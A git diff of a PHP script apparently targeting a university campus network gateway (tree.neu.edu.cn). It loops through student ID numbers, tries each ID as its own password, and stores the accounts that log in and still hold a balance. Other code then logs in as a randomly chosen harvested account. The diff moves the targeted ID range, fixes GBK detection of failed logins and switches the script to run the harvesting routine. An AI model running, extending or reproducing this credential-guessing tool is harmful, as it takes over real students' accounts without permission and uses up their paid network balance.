@@ -30,6 +30,10 @@ class IPGW {
      * @var resource 数据库连接句柄
      */
     private $dbc;
+    /**
+     * @var int 错误次数
+     */
+    private $errorCount = 0;
 
     /**
      * IPGW constructor.
@@ -77,10 +81,14 @@ class IPGW {
         curl_setopt($ch, CURLOPT_USERAGENT,
                     'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
         $bool = curl_exec($ch);
-        curl_close($ch);
         if ($bool === false) {
+            if ($this->errorCount++ > 10) {
+                die("连接错误: " . curl_error($ch));
+            }
+
             return false;
         }
+        curl_close($ch);
 
         //登陆
         $loginUrl = 'http://tree.neu.edu.cn/user/user.Account?operation=login';
@@ -95,10 +103,11 @@ class IPGW {
                     'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
         $response = curl_exec($ch);
         //user.Account?operation与user_banner.html的唯一区别
-        if (false !== strpos($response, "<!--Add below-->" . "<td><table><tr><td nowrap><font color=\"ffffff\" >")
-            //todo 这里的口令错误是utf编码，而网页上的是GBK，所以这里的strpos结果不准确
-            && false === strpos($response,
-                                "<!--Add below-->" . "<td><table><tr><td nowrap><font color=\"ffffff\" >口令错误.</font>")
+        if (false !== strpos($response, iconv('utf-8', 'gbk',
+                                              "<!--Add below-->" . "<td><table><tr><td nowrap><font color=\"ffffff\" >"))
+            // 这里的口令错误是utf编码，而网页上的是GBK，所以这里的strpos结果不准确
+            && false === strpos($response, iconv('utf-8', 'gbk', "口令错误"))
+            && false === strpos($response, iconv('utf-8', 'gbk', '没有输入用户ID'))
         ) {
             return true;
         }
@@ -179,8 +188,7 @@ class IPGW {
         $count = 'select count(*) from info WHERE aval=1 AND balance >10';
         $res = mysqli_query($this->dbc, $count) or die('Error querying db: ' . mysqli_error($this->dbc));
 
-        return mysqli_fetch_array($res)[0];
-
+        return mysqli_fetch_array($res,MYSQLI_NUM)[0];
     }
 
     /**
@@ -205,15 +213,15 @@ class IPGW {
 
         $this->clean();
         $count = $this->count();
-        $id    = 20155888;
-        while ($count < 100 && $id < 20159000) {
+        //20140379
+        $id = 20142714;
+        while ($count < 100 && $id < 20149000) {
             while ($this->exist($id)) {
                 ++$id;
                 echo "exist: $id\n";
             }
             $this->id   = $id;
             $this->pass = $this->id;
-
             if ($this->getOne()) {
                 echo 'success: ' . $this->id . "\n";
                 ++$count;
@@ -306,10 +314,11 @@ class IPGW {
 
         $query = "select * from info WHERE aval=1 AND balance >0";
         $res = mysqli_query($this->dbc, $query) or die("login: " . mysqli_error($this->dbc));
-        while ($goodmen[] = mysqli_fetch_array($res)) {
-            //测试一下fetch_all
-        }
+
+        $goodmen = mysqli_fetch_all($res, MYSQLI_ASSOC);
+
         do {
+            //array_rand返回的是一个随机的键名
             $goodman = $goodmen[array_rand($goodmen)];
             $id      = $goodman['id'];
             //断开全部连接
@@ -322,7 +331,7 @@ class IPGW {
 
 }
 
-//$ipgw = new IPGW();
-//$ipgw->collect();
-IPGW::loginMyself();
+$ipgw = new IPGW();
+$ipgw->collect();
+//IPGW::loginMyself();
 //$ipgw->login(true);
